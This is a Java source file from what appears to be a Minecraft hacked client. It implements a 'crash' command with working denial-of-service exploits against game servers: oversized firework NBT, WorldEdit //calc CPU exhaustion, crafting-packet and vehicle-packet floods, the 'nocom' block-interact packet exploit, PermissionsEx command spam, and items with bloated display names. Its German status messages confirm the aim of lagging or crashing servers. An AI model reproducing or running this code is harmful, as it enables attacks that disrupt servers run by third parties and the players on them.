package com.hakai.commands;

import com.hakai.main.HakaiClient;
import com.mojang.brigadier.arguments.IntegerArgumentType;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import com.mojang.brigadier.exceptions.CommandSyntaxException;
import com.hakai.command.Command;
import com.hakai.utils.ItemUtils;
import com.hakai.utils.MessageUtils;
import com.hakai.utils.toast.AdvancementMessage;
import com.hakai.utils.toast.ToastIcon;
import net.minecraft.client.MinecraftClient;
import net.minecraft.client.network.ClientPlayNetworkHandler;
import net.minecraft.command.CommandSource;
import net.minecraft.entity.Entity;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.nbt.NbtDouble;
import net.minecraft.nbt.NbtList;
import net.minecraft.nbt.StringNbtReader;
import net.minecraft.network.packet.c2s.play.*;
import net.minecraft.recipe.Recipe;
import net.minecraft.text.Text;
import net.minecraft.util.Hand;
import net.minecraft.util.hit.BlockHitResult;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;
import net.minecraft.util.math.Vec3d;

import java.util.Objects;
import java.util.Random;

public class Crash extends Command {
	public static boolean nonsense = false;
	private static boolean nonsense_loop = false;
	private static int packetsPerTick = 0;
	private static int tickDelay = 0;
	private static int currentTickCount = 0;
	private static boolean currentRecipeIsTwo = false;

	public static boolean rideFucker = false;
	private static Entity rideFuckerEntity = null;

	public static boolean friend = false;

	private static Recipe<?> r1, r2;

	public Crash() {
		super("crash", "<method> [args]");
		HakaiClient.getInstance().registerHUDElement(() -> {
			if(nonsense)
				return "Craft-Crash\n\u27A5 Packets per Second: " + packetsPerTick * 20;
			return null;
		});
		HakaiClient.getInstance().registerHUDElement(() -> {
			if(friend)
				return "Friend-Add-Crash";
			return null;
		});
		HakaiClient.getInstance().registerHUDElement(() -> {
			if(rideFucker)
				return "Vehicle-Spam";
			return null;
		});
	}

	@Override
	public void build(LiteralArgumentBuilder<CommandSource> builder) {
		builder.then(literal("firework").executes(context -> {
			ItemUtils.checkCreative();
			ItemStack itm = new ItemStack(Items.FIREWORK_ROCKET);

			NbtCompound nbtExplosionsElement = StringNbtReader.parse("{Type:1,Flicker:1b,Trail:1b,Colors:[I;65280,255,0,16711680,16777215]}");

			NbtList nbtExplosionsList = new NbtList();

			for(int i=0; i<999; i++) {
				nbtExplosionsList.add(nbtExplosionsElement);
			}

			NbtCompound nbtFireworks = new NbtCompound();
			nbtFireworks.put("Explosions", nbtExplosionsList);
			NbtCompound nbt = new NbtCompound();
			nbt.put("Fireworks", nbtFireworks);

			NbtCompound nbtEntityTag = new NbtCompound();
			NbtList nbtPosList = new NbtList();

			nbtPosList.add(NbtDouble.of(MinecraftClient.getInstance().player.getX()));
			nbtPosList.add(NbtDouble.of(MinecraftClient.getInstance().player.getY()));
			nbtPosList.add(NbtDouble.of(MinecraftClient.getInstance().player.getZ()));
			nbtEntityTag.put("Pos", nbtPosList);
			nbt.put("EntityTag", nbtEntityTag);

			itm.setNbt(nbt);
			ItemUtils.giveItem(itm);

			return SINGLE_SUCCESS;
		})).then(literal("friend-add").executes(context -> {
			friend = !friend;
			if(friend)
				AdvancementMessage.displayMessage(Text.of("Module"), Text.of("§aFriend-Add wurde aktiviert."), ToastIcon.WARNING);
			else
				AdvancementMessage.displayMessage(Text.of("Module"), Text.of("§cFriend-Add wurde deaktiviert."), ToastIcon.WARNING);
			return SINGLE_SUCCESS;
		})).then(literal("worldedit").executes(context -> {
			MinecraftClient.getInstance().player.sendChatMessage("//calc for(i=0;i<256;i++){for(j=0;j<256;j++){for(k=0;k<256;k++){for(l=0;l<256;l++){ln(pi)}}}}");
			MessageUtils.printChatMessageWithPrefix("§aCommand wurde ausgeführt");
			return  SINGLE_SUCCESS;
		})).then(literal("craft").then(argument("PacketsPerSecond", IntegerArgumentType.integer(1, 20000)).executes(context -> {
			int packetsPerSecond = IntegerArgumentType.getInteger(context, "PacketsPerSecond");
			if(packetsPerSecond > 20) {
				tickDelay = 0;
				packetsPerTick = packetsPerSecond / 20;
			}else {
				tickDelay = 20 / packetsPerSecond;
				packetsPerTick = 1;
			}
			if(!nonsense){
				nonsense = true;
				r1 = null;
				r2 = null;
				MessageUtils.printChatMessageWithPrefix("§aGehe in ein Crafting Table und wähle 2 Rezepte aus.");
			}else
				MessageUtils.printChatMessageWithPrefix("§aGeschwindigkeit auf " + packetsPerSecond + " geändert");

			return SINGLE_SUCCESS;
		}))).then(literal("craft").executes(context -> {
			if(nonsense){
				nonsense = false;
				nonsense_loop = false;
				AdvancementMessage.displayMessage(Text.of("Module"), Text.of("§cCraft-Crash wurde deaktiviert."), ToastIcon.WARNING);
			}else{
				tickDelay = 0;
				packetsPerTick = 4;
				nonsense = true;

				r1 = null;
				r2 = null;
				MessageUtils.printChatMessageWithPrefix("§aGehe in ein Crafting Table und wähle 2 Rezepte aus.");
			}
			return SINGLE_SUCCESS;
		})).then(literal("vehiclespam").executes(context -> {
			if(MinecraftClient.getInstance().player.getVehicle() != null){
				rideFucker = !rideFucker;
				if(rideFucker) {
					rideFuckerEntity = MinecraftClient.getInstance().player.getVehicle();
					AdvancementMessage.displayMessage(Text.of("Module"), Text.of("§aVehicle-Spam wurde aktiviert."), ToastIcon.WARNING);
				} else
					AdvancementMessage.displayMessage(Text.of("Module"), Text.of("§cVehicle-Spam wurde deaktiviert."), ToastIcon.WARNING);
				Thread thread = new Thread(() -> {
					while (rideFucker){
						if(rideFucker && rideFuckerEntity != null){
							if(MinecraftClient.getInstance().player == null || MinecraftClient.getInstance().player.networkHandler == null)
								return;
							if(!MinecraftClient.getInstance().player.isRiding())
								MinecraftClient.getInstance().player.startRiding(rideFuckerEntity, false);
							MinecraftClient.getInstance().player.networkHandler.sendPacket(new VehicleMoveC2SPacket(rideFuckerEntity));
						}
					}
				});
				thread.start();
			}else
				MessageUtils.printChatMessageWithPrefix("§cDu musst auf einer Entity sitzen!");
			return SINGLE_SUCCESS;
		})).then(literal("nocom").then(argument("force", IntegerArgumentType.integer(10, 2000)).executes(context -> {
			int amount = IntegerArgumentType.getInteger(context, "force");
			MessageUtils.printChatMessageWithPrefix("§aDer Crash wird etwa " + amount * 10 + "ms brauchen...");
			Thread t = new Thread(() -> {
				try {
					for(int i = 0; i < amount; ++i) {
						if (MinecraftClient.getInstance().getNetworkHandler() == null)
							break;

						Thread.sleep(10L);
						Vec3d cpos = this.pickRandomPos();
						PlayerInteractBlockC2SPacket packet = new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, new BlockHitResult(cpos, Direction.DOWN, new BlockPos(cpos), false));
						Objects.requireNonNull(MinecraftClient.getInstance().getNetworkHandler()).sendPacket(packet);
					}
					MessageUtils.printChatMessageWithPrefix("§aCrash beendet. Server sollte anfangen zu laggen.");
				} catch (Exception e) {
					e.printStackTrace();
					MessageUtils.printChatMessageWithPrefix("§cBeim Crashen ist ein Problem aufgetreten!");
				}

			});
			t.start();
			return SINGLE_SUCCESS;
		}))).then(literal("pex").then(argument("delay-ms", IntegerArgumentType.integer(10, 1000)).executes((context -> {
			Thread thread = new Thread(() -> {
				String text = "";
				int delay = IntegerArgumentType.getInteger(context, "delay-ms");
				for(int i = 0; i < 100; i++){
					text += new Random().nextInt(9);
					MinecraftClient.getInstance().player.sendChatMessage("/pex promote " + text + " " + text);
					try { Thread.sleep(delay); } catch (InterruptedException e) { }
					MinecraftClient.getInstance().player.sendChatMessage("/pex demote " + text + " " + text);
					try { Thread.sleep(delay); } catch (InterruptedException e) { }
				}
			});
			thread.start();
			return SINGLE_SUCCESS;
		})))).then(literal("crea-ddos").then(argument("force", IntegerArgumentType.integer(10, 500)).executes((context -> {
			Thread t = new Thread(() -> {
				MessageUtils.printChatMessageWithPrefix("§aCrash wurde gestartet...");
				for(int i = 0; i < IntegerArgumentType.getInteger(context, "force"); i++){
					ItemStack stack = new ItemStack(Items.DRAGON_EGG, 1);
					try {
						ItemUtils.checkCreative();
					} catch (CommandSyntaxException e) {}
					String tag = "{display:{Name:'{\"text\":\"";
					for (int x = 0; x < 300; x++){
						tag += "§a§c";
					}
					try {
						stack.setNbt(StringNbtReader.parse(tag + "\"}'}}"));
					} catch (CommandSyntaxException e) {}
					ItemUtils.giveItem(stack);
					MessageUtils.printChatMessageWithPrefix("§aDas Item wurde erstellt.");
					try {
						Thread.sleep(10);
					} catch (InterruptedException e) {}
				}
			});
			t.start();
			return SINGLE_SUCCESS;
		}))));
	}

	/*))*/

	public static void tick(){
		if(MinecraftClient.getInstance().player == null || MinecraftClient.getInstance().player.networkHandler == null) {
			nonsense = false;
			nonsense_loop = false;
			friend = false;
			rideFucker = false;
			return;
		}
		if(nonsense_loop){
			if(currentTickCount >= tickDelay){
				currentTickCount = 0;

				ClientPlayNetworkHandler handler = MinecraftClient.getInstance().player.networkHandler;
				int syncId = MinecraftClient.getInstance().player.playerScreenHandler.syncId;

				for(int i = 0; i < packetsPerTick; i++){
					currentRecipeIsTwo = !currentRecipeIsTwo;
					if(currentRecipeIsTwo)
						handler.sendPacket(new CraftRequestC2SPacket(syncId, r2, true));
					else
						handler.sendPacket(new CraftRequestC2SPacket(syncId, r1, true));
				}
			}else {
				currentTickCount++;
			}
		}
		if(friend) {
			MinecraftClient.getInstance().player.sendChatMessage("/friends add fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff");
		}
	}

	Vec3d pickRandomPos() {
		Random r = new Random();
		int x = r.nextInt(16777215);
		int y = 255;
		int z = r.nextInt(16777215);
		return new Vec3d((double)x, (double)y, (double)z);
	}

	public static void clickedRecipe(Recipe<?> recipe){
		if(!nonsense) return;
		if(r1 == null){
			r1 = recipe;
			MessageUtils.printChatMessageWithPrefix("§aErstes Rezept gesetzt");
		}else if (r2 == null){
			r2 = recipe;
			MessageUtils.printChatMessageWithPrefix("§aZweites Rezept gesetzt");
			MessageUtils.printChatMessageWithPrefix("§aExploit gestartet\n§7Stoppe mit #crash craft\n§7Geschwindigkeit mit #crash craft <pps>");
			AdvancementMessage.displayMessage(Text.of("Module"), Text.of("§aCraft-Crash wurde aktiviert."), ToastIcon.WARNING);
			nonsense_loop = true;
		}
	}
}
